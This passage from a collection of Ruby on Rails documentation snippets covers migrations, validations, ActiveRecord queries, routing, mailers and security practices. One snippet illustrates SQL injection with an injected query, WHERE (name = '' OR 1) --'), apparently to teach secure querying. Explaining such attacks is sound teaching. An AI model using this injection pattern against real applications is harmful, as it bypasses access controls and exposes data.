  add_enum_value :article_state, "approved", after: "in review"
  add_enum_value :article_state, "rejected", if_not_exists: true # won't raise an error if the value already exists
end

LANGUAGE: ruby
CODE:
# db/migrate/20150722144915_rename_article_state.rb
def change
  rename_enum_value :article_state, from: "archived", to: "deleted"
end

LANGUAGE: sql
CODE:
SELECT n.nspname AS enum_schema,
       t.typname AS enum_name,
       e.enumlabel AS enum_value
  FROM pg_type t
      JOIN pg_enum e ON t.oid = e.enumtypid
      JOIN pg_catalog.pg_namespace n ON n.oid = t.typnamespace

----------------------------------------

TITLE: Sessions Controller with Authentication
DESCRIPTION: Sessions controller that handles user authentication using the authenticate_by method. It creates a new session for a user when valid credentials are provided.

LANGUAGE: ruby
CODE:
class SessionsController < ApplicationController
  def create
    if user = User.authenticate_by(params.permit(:email_address, :password))
      start_new_session_for user
      redirect_to after_authentication_url
    else
      redirect_to new_session_url, alert: "Try another email address or password."
    end
  end

  # ...
end

----------------------------------------

TITLE: Creating Custom Validation Methods in Rails
DESCRIPTION: Demonstrates how to define custom validation methods and register them using the validate class method. This approach allows for complex validation logic directly within model classes.

LANGUAGE: ruby
CODE:
class Invoice < ApplicationRecord
  validate :expiration_date_cannot_be_in_the_past,
    :discount_cannot_be_greater_than_total_value

  def expiration_date_cannot_be_in_the_past
    if expiration_date.present? && expiration_date < Date.today
      errors.add(:expiration_date, "can't be in the past")
    end
  end

  def discount_cannot_be_greater_than_total_value
    if discount > total_value
      errors.add(:discount, "can't be greater than total value")
    end
  end
end

----------------------------------------

TITLE: Configuring Rails for UUID Primary Keys
DESCRIPTION: Configuration code to set UUID as the default primary key type for ActiveRecord models in a Rails application. This is added to the application configuration file to ensure all new models use UUIDs.

LANGUAGE: ruby
CODE:
config.generators do |g|
  g.orm :active_record, primary_key_type: :uuid
end

----------------------------------------

TITLE: Using Resources Shorthand for CRUD Routes in Rails
DESCRIPTION: Demonstrates the concise resources shorthand that generates all standard CRUD routes. This single line replaces the need to manually define each individual route for a resource, simplifying route management.

LANGUAGE: ruby
CODE:
resources :products

----------------------------------------

TITLE: Checking Rails Version in Console
DESCRIPTION: Example of using the Rails console to check the current version of Rails being used in the application.

LANGUAGE: irb
CODE:
store(dev)> Rails.version
=> "8.1.0"

----------------------------------------

TITLE: Implementing Nested Layouts in Rails Applications
DESCRIPTION: Demonstrates how to create nested layouts in Rails that extend or modify the main application layout for specific controllers. This approach uses content_for blocks to insert custom content.

LANGUAGE: html+erb
CODE:
<html>
<head>
  <title><%= @page_title or "Page Title" %></title>
  <%= stylesheet_link_tag "layout" %>
  <%= yield :head %>
</head>
<body>
  <div id="top_menu">Top menu items here</div>
  <div id="menu">Menu items here</div>
  <div id="content"><%= content_for?(:content) ? yield(:content) : yield %></div>
</body>
</html>

LANGUAGE: html+erb
CODE:
<% content_for :head do %>
  <style>
    #top_menu {display: none}
    #right_menu {float: right; background-color: yellow; color: black}
  </style>
<% end %>
<% content_for :content do %>
  <div id="right_menu">Right menu items here</div>
  <%= content_for?(:news_content) ? yield(:news_content) : yield %>
<% end %>
<%= render template: "layouts/application" %>

----------------------------------------

TITLE: Filtering and Ordering Records in Rails
DESCRIPTION: Shows how to use the where method to filter records by attributes and the order method to sort results. This example finds all books by a specific author and orders them by creation date in descending order.

LANGUAGE: ruby
CODE:
# Find all books by a given author, sort by created_at in reverse chronological order.
Book.where(author: "Douglas Adams").order(created_at: :desc)

----------------------------------------

TITLE: Declaring Deterministic Encrypted Attributes for Queryable Data
DESCRIPTION: Example of using deterministic encryption which enables finding records by their encrypted attributes. This allows querying while still encrypting the data.

LANGUAGE: ruby
CODE:
class Author < ApplicationRecord
  encrypts :email, deterministic: true
end

Author.find_by_email("some@email.com") # You can query the model normally

----------------------------------------

TITLE: Finding Records by Attributes with find_by in Ruby on Rails
DESCRIPTION: The find_by method finds the first record matching specified conditions. It returns nil if no match is found, while find_by! raises ActiveRecord::RecordNotFound if no match is found.

LANGUAGE: irb
CODE:
irb> Customer.find_by first_name: 'Lifo'
=> #<Customer id: 1, first_name: "Lifo">

irb> Customer.find_by first_name: 'Jon'
=> nil

LANGUAGE: ruby
CODE:
Customer.where(first_name: "Lifo").take

LANGUAGE: sql
CODE:
SELECT * FROM customers WHERE (customers.first_name = 'Lifo') LIMIT 1

LANGUAGE: irb
CODE:
irb> Customer.find_by! first_name: 'does not exist'
ActiveRecord::RecordNotFound

LANGUAGE: ruby
CODE:
Customer.where(first_name: "does not exist").take!

LANGUAGE: irb
CODE:
irb> customer = Customer.last
=> #<Customer id: 10, store_id: 5, first_name: "Joe">
irb> Customer.find_by(id: customer.id) # Customer.find_by(id: [5, 10])
=> #<Customer id: 5, store_id: 3, first_name: "Bob">

LANGUAGE: irb
CODE:
irb> customer = Customer.last
=> #<Customer id: 10, store_id: 5, first_name: "Joe">
irb> Customer.find_by(id: customer.id_value) # Customer.find_by(id: 10)
=> #<Customer id: 10, store_id: 5, first_name: "Joe">

----------------------------------------

TITLE: Defining a Route with Parameters in Rails
DESCRIPTION: Demonstrates how to define a route with a dynamic parameter. The ':id' parameter will capture a portion of the URL and make it available to the controller action, allowing for operations on specific resources.

LANGUAGE: ruby
CODE:
get "/products/:id", to: "products#show"

----------------------------------------

TITLE: Low-Level Caching with Rails.cache.fetch in a Model Method
DESCRIPTION: This example demonstrates how to implement low-level caching in a model method using Rails.cache.fetch. The method caches the result of an expensive API call to find a competing price for 12 hours.

LANGUAGE: ruby
CODE:
class Product < ApplicationRecord
  def competing_price
    Rails.cache.fetch("#{cache_key_with_version}/competing_price", expires_in: 12.hours) do
      Competitor::API.find_price(id)
    end
  end
end

----------------------------------------

TITLE: GlobalID Object Serialization for Active Job in Rails
DESCRIPTION: Shows how to use Rails' GlobalID feature to pass Active Record objects directly to background jobs, simplifying job implementation by eliminating manual serialization and deserialization.

LANGUAGE: ruby
CODE:
class TrashableCleanupJob < ApplicationJob
  def perform(trashable, depth)
    trashable.cleanup(depth)
  end
end

----------------------------------------

TITLE: Implementing a Basic Model with ActiveModel::API in Ruby
DESCRIPTION: This snippet shows how to create an EmailContact class using ActiveModel::API to add model-like features such as validations and attribute assignment to a plain Ruby object. It demonstrates how to define attributes and validation rules.

LANGUAGE: ruby
CODE:
class EmailContact
  include ActiveModel::API

  attr_accessor :name, :email, :message
  validates :name, :email, :message, presence: true

  def deliver
    if valid?
      # Deliver email
    end
  end
end

----------------------------------------

TITLE: Implementing Uniqueness Validation in Rails
DESCRIPTION: This snippet demonstrates how to validate that an attribute's value is unique before an object is saved. The validation is performed by executing an SQL query to check for existing records with the same value.

LANGUAGE: ruby
CODE:
class Account < ApplicationRecord
  validates :email, uniqueness: true
end

----------------------------------------

TITLE: Exploited SQL Query Through SQL Injection
DESCRIPTION: Shows how the vulnerable query would be transformed when a malicious user inputs specially crafted code designed to bypass filtering.

LANGUAGE: sql
CODE:
SELECT * FROM projects WHERE (name = '' OR 1) --')

----------------------------------------

TITLE: Defining a Model Namespace Module with Table Prefix in Rails
DESCRIPTION: Creates a Book module that sets a table name prefix for all models within the Book namespace. This ensures tables for namespaced models like Book::Order will be prefixed with 'book_'.

LANGUAGE: ruby
CODE:
module Book
  def self.table_name_prefix
    "book_"
  end
end

----------------------------------------

TITLE: Model Structure for Delegated Types in Rails
DESCRIPTION: Example model structure for implementing delegated types. Shows Entry as the superclass and Message and Comment as separate models with their own tables.

LANGUAGE: ruby
CODE:
# Schema: entries[ id, entryable_type, entryable_id, created_at, updated_at ]
class Entry < ApplicationRecord
end

# Schema: messages[ id, subject, body, created_at, updated_at ]
class Message < ApplicationRecord
end

# Schema: comments[ id, content, created_at, updated_at ]
class Comment < ApplicationRecord
end

----------------------------------------

TITLE: Creating a Custom Form Helper in ApplicationHelper
DESCRIPTION: Defines a custom form helper method in the ApplicationHelper module that combines a label and text field. This approach allows for reusing common form patterns without customizing the FormBuilder class.

LANGUAGE: ruby
CODE:
module ApplicationHelper
  def text_field_with_label(form, attribute)
    form.label(attribute) + form.text_field(attribute)
  end
end

----------------------------------------

TITLE: Class-Based Validation with validates_with in Rails
DESCRIPTION: This snippet demonstrates how to use a separate validator class for validation. The AddressValidator class checks multiple fields and adds appropriate error messages when validation fails.

LANGUAGE: ruby
CODE:
class AddressValidator < ActiveModel::Validator
  def validate(record)
    if record.house_number.blank?
      record.errors.add :house_number, "is required"
    end

    if record.street.blank?
      record.errors.add :street, "is required"
    end

    if record.postcode.blank?
      record.errors.add :postcode, "is required"
    end
  end
end

class Invoice < ApplicationRecord
  validates_with AddressValidator
end

----------------------------------------

TITLE: Complete Author and Book Models with Validation in Ruby on Rails
DESCRIPTION: Full model definitions for Author and Book with associations and validations. The Author model has a validation requiring the name attribute to be present.

LANGUAGE: ruby
CODE:
# app/models/book.rb
class Book < ApplicationRecord
  belongs_to :author
end

# app/models/author.rb
class Author < ApplicationRecord
  has_many :books
  validates :name, presence: true
end

----------------------------------------

TITLE: Using before_action for Authentication in Rails
DESCRIPTION: Implements a before_action callback in ApplicationController to require users to be logged in before accessing controller actions. The callback halts the request cycle with a redirect if the user isn't logged in.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  before_action :require_login

  private
    def require_login
      unless logged_in?
        flash[:error] = "You must be logged in to access this section"
        redirect_to new_login_url # halts request cycle
      end
    end
end

----------------------------------------

TITLE: Basic Validation Example with Name Validation
DESCRIPTION: This example demonstrates basic validations for a Person model, requiring the name to be present and at least 3 characters long. It shows how validation rules are defined on model attributes.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :name, presence: true, length: { minimum: 3 }
end

----------------------------------------

TITLE: Using includes to Solve the N+1 Query Problem
DESCRIPTION: Shows how to use eager loading with the includes method to solve the N+1 query problem. This optimized version loads all books and their authors in just 2 queries instead of 11, significantly improving performance.

LANGUAGE: ruby
CODE:
books = Book.includes(:author).limit(10)

books.each do |book|
  puts book.author.last_name
end

LANGUAGE: sql
CODE:
SELECT books.* FROM books LIMIT 10
SELECT authors.* FROM authors
  WHERE authors.id IN (1,2,3,4,5,6,7,8,9,10)

----------------------------------------

TITLE: Implementing Counter Cache in Rails Associations
DESCRIPTION: Shows how to add counter cache to a belongs_to association to avoid database COUNT queries when getting collection size.

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  belongs_to :author, counter_cache: true
end

class Author < ApplicationRecord
  has_many :books
end

----------------------------------------

TITLE: Using pluck to retrieve specific columns in Rails ActiveRecord
DESCRIPTION: Demonstrates how to use the pluck method to retrieve specific columns directly as a Ruby Array without constructing ActiveRecord objects. This is more efficient for large or frequently-run queries.

LANGUAGE: ruby
CODE:
Customer.pluck(:id, :first_name)

LANGUAGE: ruby
CODE:
class Customer < ApplicationRecord
  def name
    "I am #{first_name}"
  end
end

LANGUAGE: ruby
CODE:
Customer.select(:first_name).map &:name
=> ["I am David", "I am Jeremy", "I am Jose"]

Customer.pluck(:first_name)
=> ["David", "Jeremy", "Jose"]

LANGUAGE: ruby
CODE:
Order.joins(:customer, :books).pluck("orders.created_at, customers.email, books.title")

LANGUAGE: ruby
CODE:
Customer.pluck(:first_name).limit(1)
NoMethodError: undefined method `limit' for #<Array:0x007ff34d3ad6d8>

Customer.limit(1).pluck(:first_name)
=> ["David"]

LANGUAGE: ruby
CODE:
assoc = Customer.includes(:reviews)
assoc.pluck(:id)
SELECT "customers"."id" FROM "customers" LEFT OUTER JOIN "reviews" ON "reviews"."id" = "customers"."review_id"

LANGUAGE: ruby
CODE:
assoc.unscope(:includes).pluck(:id)

----------------------------------------

TITLE: Accessing Book Attributes in Ruby IRB Console
DESCRIPTION: Interactive Ruby example showing how to create a new Book instance and access its attributes. Demonstrates the object-oriented interface provided by Active Record.

LANGUAGE: ruby
CODE:
irb> book = Book.new
=> #<Book:0x00007fbdf5e9a038 id: nil, title: nil, author: nil, created_at: nil, updated_at: nil>

irb> book.title = "The Hobbit"
=> "The Hobbit"
irb> book.title
=> "The Hobbit"

----------------------------------------

TITLE: Creating Database Views in PostgreSQL with Rails
DESCRIPTION: Shows how to create a database view that wraps a legacy table to make it follow Rails conventions. PostgreSQL views are updateable by default.

LANGUAGE: ruby
CODE:
# db/migrate/20131220144913_create_articles_view.rb
execute <<-SQL
CREATE VIEW articles AS
  SELECT "INT_ID" AS id,
         "STR_TITLE" AS title,
         "STR_STAT" AS status,
         "DT_PUBL_AT" AS published_at,
         "BL_ARCH" AS archived
  FROM "TBL_ART"
  WHERE "BL_ARCH" = 'f'
SQL

----------------------------------------

TITLE: Sanitizing Filenames for Secure File Uploads in Ruby
DESCRIPTION: This method sanitizes user-supplied filenames to prevent path traversal attacks by removing path components and replacing non-alphanumeric characters with underscores. Sourced from the attachment_fu plugin, it demonstrates a secure way to process uploaded filenames.

LANGUAGE: ruby
CODE:
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.sub!(/\A.*(\\\/|\/)/,"")
    # Finally, replace all non alphanumeric, underscore
    # or periods with underscore
    name.gsub!(/[^\w.-]/, "_")
  end
end

----------------------------------------

TITLE: Testing Model Validation in Rails
DESCRIPTION: Demonstrates writing a test that validates a model cannot be saved without a required attribute, showing a test-driven development approach.

LANGUAGE: ruby
CODE:
require "test_helper"

class ArticleTest < ActiveSupport::TestCase
  test "should not save article without title" do
    article = Article.new
    assert_not article.save
  end
end

----------------------------------------

TITLE: Sending Emails with Dynamic Delivery Options in Rails
DESCRIPTION: Example of overriding default SMTP settings for a specific email using delivery_method_options. This allows for dynamic configuration of email delivery based on parameters or context.

LANGUAGE: ruby
CODE:
class UserMailer < ApplicationMailer
  def welcome_email
    @user = params[:user]
    @url  = user_url(@user)
    delivery_options = { user_name: params[:company].smtp_user,
                         password: params[:company].smtp_password,
                         address: params[:company].smtp_host }
    mail(to: @user.email,
         subject: "Please see the Terms and Conditions attached",
         delivery_method_options: delivery_options)
  end
end

----------------------------------------

TITLE: Generating a Create Table Migration in Rails
DESCRIPTION: This command generates a migration to create a products table with name and part_number columns. The generator interprets the CreateXXX naming pattern and column specifications.

LANGUAGE: bash
CODE:
$ bin/rails generate migration CreateProducts name:string part_number:string

----------------------------------------

TITLE: Implementing Exception Handling for Action Cable Connections in Rails
DESCRIPTION: Global exception handling for WebSocket connections using rescue_from. This allows intercepting and reporting unhandled exceptions to external services rather than just logging them to Rails' logger.

LANGUAGE: ruby
CODE:
# app/channels/application_cable/connection.rb
module ApplicationCable
  class Connection < ActionCable::Connection::Base
    rescue_from StandardError, with: :report_error

    private
      def report_error(e)
        SomeExternalBugtrackingService.notify(e)
      end
  end
end

----------------------------------------

TITLE: Checking existence of objects in Rails ActiveRecord
DESCRIPTION: Demonstrates various methods for checking if records exist in the database, including exists?, any?, and many?. These methods efficiently check for record existence without loading full objects.

LANGUAGE: ruby
CODE:
Customer.exists?(1)

LANGUAGE: ruby
CODE:
Customer.exists?(id: [1, 2, 3])
# or
Customer.exists?(first_name: ["Jane", "Sergei"])

LANGUAGE: ruby
CODE:
Customer.where(first_name: "Ryan").exists?

LANGUAGE: ruby
CODE:
Customer.exists?

LANGUAGE: ruby
CODE:
# via a model
Order.any?
# SELECT 1 FROM orders LIMIT 1
Order.many?
# SELECT COUNT(*) FROM (SELECT 1 FROM orders LIMIT 2)

# via a named scope
Order.shipped.any?
# SELECT 1 FROM orders WHERE orders.status = 0 LIMIT 1
Order.shipped.many?
# SELECT COUNT(*) FROM (SELECT 1 FROM orders WHERE orders.status = 0 LIMIT 2)

# via a relation
Book.where(out_of_print: true).any?
Book.where(out_of_print: true).many?

# via an association
Customer.first.orders.any?
Customer.first.orders.many?

----------------------------------------

TITLE: Configuring Automatic Database Connection Switching
DESCRIPTION: Configuration for enabling automatic connection switching between writer and replica databases based on request method and timing of recent writes.

LANGUAGE: ruby
CODE:
Rails.application.configure do
  config.active_record.database_selector = { delay: 2.seconds }
  config.active_record.database_resolver = ActiveRecord::Middleware::DatabaseSelector::Resolver
  config.active_record.database_resolver_context = ActiveRecord::Middleware::DatabaseSelector::Resolver::Session
end

----------------------------------------

TITLE: Presence Validation in Rails
DESCRIPTION: Shows how to validate that specified attributes are not empty using the presence validator. This ensures name, login, and email are all present.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :name, :login, :email, presence: true
end

----------------------------------------

TITLE: Implementing Custom Authorization Error Handling
DESCRIPTION: Demonstrates a complete example of custom authorization error handling using rescue_from and a custom exception class. Includes both the ApplicationController setup and the ClientsController implementation with authorization checking.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  rescue_from User::NotAuthorized, with: :user_not_authorized

  private
    def user_not_authorized
      flash[:error] = "You don't have access to this section."
      redirect_back(fallback_location: root_path)
    end
end

class ClientsController < ApplicationController
  # Check that the user has the right authorization to access clients.
  before_action :check_authorization

  def edit
    @client = Client.find(params[:id])
  end

  private
    # If the user is not authorized, throw the custom exception.
    def check_authorization
      raise User::NotAuthorized unless current_user.admin?
    end
end

----------------------------------------

TITLE: Broadcasting Messages with Action Cable in Ruby on Rails
DESCRIPTION: This snippet demonstrates how to broadcast messages to specific users through a WebNotificationsChannel. It places a message in the subscription adapter's pubsub queue under a unique broadcasting name for each user.

LANGUAGE: ruby
CODE:
WebNotificationsChannel.broadcast_to(
  current_user,
  title: "New things!",
  body: "All the news fit to print"
)

----------------------------------------

TITLE: Using merge with Named Scopes for Advanced Conditions
DESCRIPTION: Shows how to use the merge method to incorporate a named scope from an associated model. This combines a join with the previously defined created_in_time_range scope to find customers who placed orders in a specific time period.

LANGUAGE: ruby
CODE:
time_range = (Time.now.midnight - 1.day)..Time.now.midnight
Customer.joins(:orders).merge(Order.created_in_time_range(time_range)).distinct

----------------------------------------

TITLE: SQL Generated by Basic Active Record Queries
DESCRIPTION: Shows the SQL statements generated by basic Active Record query methods including all, first, last, and take. Demonstrates how Rails translates Ruby method calls into SQL queries.

LANGUAGE: sql
CODE:
-- Book.all
SELECT "books".* FROM "books"

-- Book.first
SELECT "books".* FROM "books" ORDER BY "books"."id" ASC LIMIT ?  [["LIMIT", 1]]

-- Book.last
SELECT "books".* FROM "books" ORDER BY "books"."id" DESC LIMIT ?  [["LIMIT", 1]]

-- Book.take
SELECT "books".* FROM "books" LIMIT ?  [["LIMIT", 1]]

----------------------------------------

TITLE: Association Presence Validation in Rails
DESCRIPTION: Demonstrates how to validate the presence of an associated object rather than just the foreign key. This example ensures a supplier has an associated account.

LANGUAGE: ruby
CODE:
class Supplier < ApplicationRecord
  has_one :account
  validates :account, presence: true
end

----------------------------------------

TITLE: Batch Processing Records with find_in_batches in Ruby on Rails
DESCRIPTION: Demonstrates how to process records in batches of 1000 using ActiveRecord's find_in_batches method. This approach is useful for handling large datasets efficiently by processing chunks of records at a time.

LANGUAGE: ruby
CODE:
Customer.recently_active.find_in_batches do |customers|
  export.add_customers(customers)
end

----------------------------------------

TITLE: Updating Records in Rails
DESCRIPTION: Demonstrates how to update a record by finding it, modifying attributes, and saving it back to the database. This example finds a book by title and then updates its title.

LANGUAGE: ruby
CODE:
book = Book.find_by(title: "The Lord of the Rings")
book.title = "The Lord of the Rings: The Fellowship of the Ring"
book.save

----------------------------------------

TITLE: Creating a Join Table with Indexes
DESCRIPTION: Migration that creates a join table with indexes on both foreign key columns to improve query performance.

LANGUAGE: ruby
CODE:
create_join_table :products, :categories do |t|
  t.index :product_id
  t.index :category_id
end

----------------------------------------

TITLE: Configuring CORS in Rails
DESCRIPTION: Initializer for configuring Cross-Origin Resource Sharing (CORS) using the Rack CORS middleware. This example allows requests from example.com to access any resource with any headers using standard HTTP methods.

LANGUAGE: ruby
CODE:
# config/initializers/cors.rb
Rails.application.config.middleware.insert_before 0, Rack::Cors do
  allow do
    origins "example.com"

    resource "*",
      headers: :any,
      methods: [:get, :post, :put, :patch, :delete, :options, :head]
  end
end

----------------------------------------

TITLE: Using permit Method for Basic Parameters in Rails
DESCRIPTION: This example demonstrates how to use the permit method to whitelist specific parameters for mass assignment. It shows the behavior of the method with different parameter combinations.

LANGUAGE: ruby
CODE:
params = ActionController::Parameters.new(id: 1, admin: "true")
=> #<ActionController::Parameters {"id"=>1, "admin"=>"true"} permitted: false>
params.permit(:id)
=> #<ActionController::Parameters {"id"=>1} permitted: true>
params.permit(:id, :admin)
=> #<ActionController::Parameters {"id"=>1, "admin"=>"true"} permitted: true>

----------------------------------------

TITLE: Creating a Form with form_with for a Book Model in Rails
DESCRIPTION: Demonstrates using form_with to create a form for a Book model with fields for title and author. This ERB template generates a form that will be submitted to the books_path.

LANGUAGE: erb
CODE:
<%= form_with model: @book do |form| %>
  <div>
    <%= form.label :title %>
    <%= form.text_field :title %>
  </div>
  <div>
    <%= form.label :author %>
    <%= form.text_field :author %>
  </div>
  <%= form.submit %>
<% end %>

----------------------------------------

TITLE: Configuring Multiple Databases in database.yml
DESCRIPTION: A YAML configuration for setting up multiple databases in Rails, including primary and replica databases with separate credentials for read and write operations.

LANGUAGE: yaml
CODE:
production:
  primary:
    database: my_primary_database
    username: root
    password: <%= ENV['ROOT_PASSWORD'] %>
    adapter: mysql2
  primary_replica:
    database: my_primary_database
    username: root_readonly
    password: <%= ENV['ROOT_READONLY_PASSWORD'] %>
    adapter: mysql2
    replica: true
  animals:
    database: my_animals_database
    username: animals_root
    password: <%= ENV['ANIMALS_ROOT_PASSWORD'] %>
    adapter: mysql2
    migrations_paths: db/animals_migrate
  animals_replica:
    database: my_animals_database
    username: animals_readonly
    password: <%= ENV['ANIMALS_READONLY_PASSWORD'] %>
    adapter: mysql2
    replica: true

----------------------------------------

TITLE: Using Named Placeholders in ActiveRecord Conditions
DESCRIPTION: Demonstrates using named placeholders with a hash of values to create more readable database queries when multiple parameters are needed.

LANGUAGE: ruby
CODE:
Book.where("created_at >= :start_date AND created_at <= :end_date",
  { start_date: params[:start_date], end_date: params[:end_date] })

----------------------------------------

TITLE: Implementing Pessimistic Locking in Rails with Transaction Block
DESCRIPTION: This example demonstrates how to use pessimistic locking in Rails to prevent concurrent updates. It locks a book record within a transaction block using the default 'FOR UPDATE' strategy, which prevents other transactions from modifying the record until the current transaction completes.

LANGUAGE: ruby
CODE:
Book.transaction do
  book = Book.lock.first
  book.title = "Algorithms, second edition"
  book.save!
end

LANGUAGE: sql
CODE:
SQL (0.2ms)   BEGIN
Book Load (0.3ms)   SELECT * FROM books LIMIT 1 FOR UPDATE
Book Update (0.4ms)   UPDATE books SET updated_at = '2009-02-07 18:05:56', title = 'Algorithms, second edition' WHERE id = 1
SQL (0.8ms)   COMMIT

----------------------------------------

TITLE: Skipping before_action for Specific Actions in Rails
DESCRIPTION: Shows how to skip a before_action callback for specific controller actions using skip_before_action. This allows exceptions to authentication requirements for actions like login.

LANGUAGE: ruby
CODE:
class LoginsController < ApplicationController
  skip_before_action :require_login, only: [:new, :create]
end

----------------------------------------

TITLE: Creating a Custom Validator Class in Rails
DESCRIPTION: Demonstrates how to create a custom validator class by inheriting from ActiveModel::Validator and implementing the validate method. This allows for complex validation logic that can be reused across models.

LANGUAGE: ruby
CODE:
class MyValidator < ActiveModel::Validator
  def validate(record)
    unless record.name.start_with? "X"
      record.errors.add :name, "Provide a name starting with X, please!"
    end
  end
end

class Person < ApplicationRecord
  validates_with MyValidator
end

----------------------------------------

TITLE: Setting Up a Custom Key Provider for Active Record Encryption
DESCRIPTION: Configures a custom key provider for encryption in an initializer. Custom key providers must implement the encryption_key and decryption_keys methods.

LANGUAGE: ruby
CODE:
ActiveRecord::Encryption.key_provider = MyKeyProvider.new

----------------------------------------

TITLE: Implementing a Welcome Email Method in UserMailer
DESCRIPTION: A UserMailer implementation with a welcome_email method that sends an email to a user. It sets default sender, assigns instance variables for the view, and configures the email headers.

LANGUAGE: ruby
CODE:
class UserMailer < ApplicationMailer
  default from: "notifications@example.com"

  def welcome_email
    @user = params[:user]
    @url  = "http://example.com/login"
    mail(to: @user.email, subject: "Welcome to My Awesome Site")
  end
end

----------------------------------------

TITLE: Implementing Email Confirmation Validation
DESCRIPTION: Example of using the confirmation validator for email fields. This validates that two fields contain the same value, useful for email or password confirmation.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :email, confirmation: true
end

----------------------------------------

TITLE: Defining Order model with Active Record associations, enums and scopes in Ruby
DESCRIPTION: Defines an Order class with belongs_to and has_and_belongs_to_many relationships, status enum definition, and a scope for filtering by creation date.

LANGUAGE: ruby
CODE:
class Order < ApplicationRecord
  belongs_to :customer
  has_and_belongs_to_many :books, join_table: "books_orders"

  enum :status, [:shipped, :being_packed, :complete, :cancelled]

  scope :created_before, ->(time) { where(created_at: ...time) }
end

----------------------------------------

TITLE: Eager Loading Multiple Associations with includes
DESCRIPTION: Demonstrates eager loading multiple associations using an array with the includes method. This query efficiently loads customers along with their associated orders and reviews in a minimal number of queries.

LANGUAGE: ruby
CODE:
Customer.includes(:orders, :reviews)

----------------------------------------

TITLE: Implementing PostgreSQL Array Type in Rails for Tags and Ratings
DESCRIPTION: Shows how to use PostgreSQL's array datatype to store collections of strings and integers, with GIN indexes for efficient querying. Includes examples of querying for items with specific array elements and checking array length.

LANGUAGE: ruby
CODE:
# db/migrate/20140207133952_create_books.rb
create_table :books do |t|
  t.string "title"
  t.string "tags", array: true
  t.integer "ratings", array: true
end
add_index :books, :tags, using: "gin"
add_index :books, :ratings, using: "gin"

LANGUAGE: ruby
CODE:
# app/models/book.rb
class Book < ApplicationRecord
end

LANGUAGE: ruby
CODE:
# Usage
Book.create title: "Brave New World",
            tags: ["fantasy", "fiction"],
            ratings: [4, 5]

## Books for a single tag
Book.where("'fantasy' = ANY (tags)")

## Books for multiple tags
Book.where("tags @> ARRAY[?]::varchar[]", ["fantasy", "fiction"])

## Books with 3 or more ratings
Book.where("array_length(ratings, 1) >= 3")

----------------------------------------

TITLE: Creating Binary Data Storage with PostgreSQL Bytea Type in Ruby on Rails
DESCRIPTION: Demonstrates how to create a table with a binary column using PostgreSQL's bytea type, which is useful for storing binary data like files. The example shows table creation, model definition, and storing a PDF file in the database.

LANGUAGE: ruby
CODE:
# db/migrate/20140207133952_create_documents.rb
create_table :documents do |t|
  t.binary "payload"
end

LANGUAGE: ruby
CODE:
# app/models/document.rb
class Document < ApplicationRecord
end

LANGUAGE: ruby
CODE:
# Usage
data = File.read(Rails.root + "tmp/output.pdf")
Document.create payload: data

----------------------------------------

TITLE: Eager Loading Nested Associations with includes
DESCRIPTION: Shows eager loading deeply nested associations using a nested hash syntax. This query loads a customer with ID 1 along with their orders, the books for each order, and the author and supplier for each book, all in a minimal number of queries.

LANGUAGE: ruby
CODE:
Customer.includes(orders: { books: [:supplier, :author] }).find(1)

----------------------------------------

TITLE: Joining Multiple Associations in ActiveRecord
DESCRIPTION: Shows how to join multiple associations in a single query. This example joins the books table with both authors and reviews tables to find books that have both an author and at least one review.

LANGUAGE: ruby
CODE:
Book.joins(:author, :reviews)

LANGUAGE: sql
CODE:
SELECT books.* FROM books
  INNER JOIN authors ON authors.id = books.author_id
  INNER JOIN reviews ON reviews.book_id = books.id

----------------------------------------

TITLE: Uniqueness Validation with Conditional WHERE Clause in Rails
DESCRIPTION: This snippet shows how to add conditional constraints to uniqueness validation. The validation only checks for duplicates among records with an 'active' status, using a WHERE SQL fragment.

LANGUAGE: ruby
CODE:
validates :name, uniqueness: { conditions: -> { where(status: "active") } }

----------------------------------------

TITLE: Using after_all_transactions_commit for Nested Transactions
DESCRIPTION: Example demonstrating ActiveRecord.after_all_transactions_commit which runs code only after all currently open transactions are committed. This is useful for actions that should occur only after the outermost transaction is completed.

LANGUAGE: ruby
CODE:
def publish_article(article)
  Article.transaction do
    Post.transaction do
      ActiveRecord.after_all_transactions_commit do
        PublishNotificationMailer.with(article: article).deliver_later
        # An email will be sent after the outermost transaction is committed.
      end
    end
  end
end

----------------------------------------

TITLE: Defining Supplier model with Active Record associations in Ruby
DESCRIPTION: Defines a Supplier class with has_many relationship to books and has_many through relationship to authors via books.

LANGUAGE: ruby
CODE:
class Supplier < ApplicationRecord
  has_many :books
  has_many :authors, through: :books
end

----------------------------------------

TITLE: Object-Based Custom Validation in Rails
DESCRIPTION: This snippet demonstrates a more complex validation approach using a plain Ruby object. This pattern is useful when validators need to maintain state or have complex validation logic that doesn't fit the standard validator pattern.

LANGUAGE: ruby
CODE:
class Invoice < ApplicationRecord
  validate do |invoice|
    AddressValidator.new(invoice).validate
  end
end

class AddressValidator
  def initialize(invoice)
    @invoice = invoice
  end

  def validate
    validate_field(:house_number)
    validate_field(:street)
    validate_field(:postcode)
  end

  private
    def validate_field(field)
      if @invoice.send(field).blank?
        @invoice.errors.add field, "#{field.to_s.humanize} is required"
      end
    end
end

----------------------------------------

TITLE: Secure Project Record Lookup with User Authorization
DESCRIPTION: Shows the secure way to find a Project record by scoping the query to only projects the current user has access to, preventing privilege escalation.

LANGUAGE: ruby
CODE:
@project = @current_user.projects.find(params[:id])

----------------------------------------

TITLE: Author and Book Models with Associations in Ruby on Rails
DESCRIPTION: Model definitions for Author and Book with has_many and belongs_to associations. This establishes a relationship where an author has many books and each book belongs to an author.

LANGUAGE: ruby
CODE:
class Author < ApplicationRecord
  has_many :books, dependent: :destroy
end

class Book < ApplicationRecord
  belongs_to :author
end

----------------------------------------

TITLE: Testing Delete Action in Rails Controller
DESCRIPTION: This test verifies that the delete action of an ArticlesController correctly removes an article from the database. It uses assert_difference to check the article count changes by -1 after deletion.

LANGUAGE: ruby
CODE:
test "should delete article" do
  article = articles(:one)
  assert_difference("Article.count", -1) do
    delete article_url(article)
  end

  assert_redirected_to articles_path
end

----------------------------------------

TITLE: Implementing HTTP Token Authentication in Rails Controller
